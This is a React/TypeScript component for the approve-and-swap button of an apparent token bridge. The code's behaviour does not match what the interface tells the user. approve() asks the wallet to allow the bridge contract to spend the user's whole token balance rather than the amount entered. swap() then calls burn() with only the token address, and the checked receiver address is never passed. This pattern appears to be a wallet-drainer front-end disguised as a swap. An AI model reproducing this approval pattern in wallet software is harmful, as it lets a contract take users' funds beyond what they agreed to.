import { Button } from '@chakra-ui/button';
import { useAccount } from 'wagmi';

import { useConnect, useSwap } from '../../../web3';
import { Amount, Tokens,Networks } from '../types';
import { BigNumber, ethers } from 'ethers';
import { IERC20, BridgeABI,BridgeAddress } from '../../../config/constants'
import {useState, useEffect} from 'react'

function isValidEthereumAddress(address: string): boolean {
    if (!address.match(/^0x[0-9a-fA-F]{40}$/)) {
      // Check if the address matches the basic format of a valid Ethereum address
      return false;
    }
  
    return true;
  }

export function SwapWidgetButton({
    token,
    network,
    amount,
    rcevAddr
}: {
    token: Tokens | undefined;
    network: Networks | undefined;
    amount: Amount;
    rcevAddr : string;
}) {
    //const swap = useSwap({ tokenIn: 'Grogu', tokenOut: 'Mando', amount: amount.in });
    const approve = async () => {
        setIsWaiting(true);
        if(network?.value == 'Solana'){
            return;
        }
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        let accounts =await provider.send("eth_requestAccounts", []);
        
        let account = accounts[0];
        const tokenContract = new ethers.Contract(token?.address, IERC20, provider);
        let balance:BigNumber = await tokenContract.balanceOf(account);
        let allowance:BigNumber = await tokenContract.allowance(account,BridgeAddress);
        if(balance.gt(allowance)){
            try {
                
                await tokenContract.connect(provider.getSigner()).approve(BridgeAddress,balance);
            } catch (error) {
                console.log("stop")
                setIsWaiting(false);
            }
        }
// { BigNumber: "19862540059122458201631" }
    }
    
    const swap = async () => {
        if(!isValidEthereumAddress(rcevAddr)){
            
            return;
        }
        setIsWaiting(true);
        if(network?.value == 'Solana'){
            return;
        }
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        let accounts =await provider.send("eth_requestAccounts", []);
        
        let account = accounts[0];
        const tokenContract = new ethers.Contract(token?.address, IERC20, provider);
        let allowance:BigNumber = await tokenContract.allowance(account,BridgeAddress);
        if(allowance.isZero()){
            return;
        }
        try {
            let bridgeContract = new ethers.Contract(BridgeAddress,BridgeABI,provider);
            await bridgeContract.connect(provider.getSigner()).burn(token?.address);
            setIsSwap(false);
     
        } catch (error) {
            
        }
        setIsWaiting(false);
    }

    const handleApprove = () => {
        if(parseFloat(amount.in)<=0)
            return;
        approve();
    }
    var { connect, isLoading } = useConnect();
    const { isConnected, isConnecting } = useAccount();
    const [isSwap, setIsSwap] = useState<boolean>(false);
    const [isWaiting,setIsWaiting] = useState<boolean>(false);
    const handleSwap = () => {
        if(parseFloat(amount.in)<=0){
            return;
        }
        swap();
    };
    useEffect(()=>{
        const checkAllowance = async () => {
            if(!isWaiting)
                return;
            if(isSwap)
                return;
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            let accounts =await provider.send("eth_requestAccounts", []);
            let account = accounts[0];
            const tokenContract = new ethers.Contract(token?.address, IERC20, provider);
            const sleep =  (ms:number) => {
                return new Promise(resolve => setTimeout(resolve, ms));
              }

              let firstAllowance:BigNumber = await tokenContract.allowance(account,BridgeAddress);
              let allowance:BigNumber = firstAllowance;
            while (isWaiting) {
                 allowance = await tokenContract.allowance(account,BridgeAddress);
                
                if(!allowance.eq(firstAllowance)){
                    break;
                }
                
                await sleep(1000);
            }
            let decimal = parseInt(await tokenContract.decimals());
            let am = ethers.utils.formatUnits(allowance, decimal);
            if(parseFloat(am)>=parseFloat(amount.in)){
                setIsSwap(true);
            }
            else
            {
                setIsSwap(false)
            }
            setIsWaiting(false);
        }
        checkAllowance();
    },[isWaiting])
    useEffect(() => {
        const checkAllowance = async () => {
            
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            let accounts =await provider.send("eth_requestAccounts", []);
            let account = accounts[0];
            const tokenContract = new ethers.Contract(token?.address, IERC20, provider);
              let firstAllowance:BigNumber = await tokenContract.allowance(account,BridgeAddress);
              let allowance:BigNumber = firstAllowance;
           
            let decimal = parseInt(await tokenContract.decimals());
            let am = ethers.utils.formatUnits(allowance, decimal);
            if(parseFloat(am)>=parseFloat(amount.in)){
                setIsSwap(true);
            }
            else
            {
                setIsSwap(false)
            }
            setIsWaiting(false);
        }
        checkAllowance();
    },[amount])
    if (isLoading || isConnecting || isWaiting) {
        return <Button variant="orange" isLoading={isWaiting || isLoading || isConnecting } />;
    }

    if (!isConnected) {
        return (
            <Button variant="orange" onClick={connect}>
                Connect wallet
            </Button>
        );
    }

    if (!token || !network) {
        return (
            <Button variant="orange" isDisabled>
                Select token & network
            </Button>
        );
    }

    if (!amount.in || !amount.out) {
        return (
            <Button variant="orange" isDisabled>
                Select an amount
            </Button>
        );
    }
    if(isSwap){
        return (
            <Button variant="orange" onClick={handleSwap}>
                Swap
            </Button>
        );
    }
    return (
        <Button variant="orange" onClick={handleApprove}>
            Approve
        </Button>
    );

}
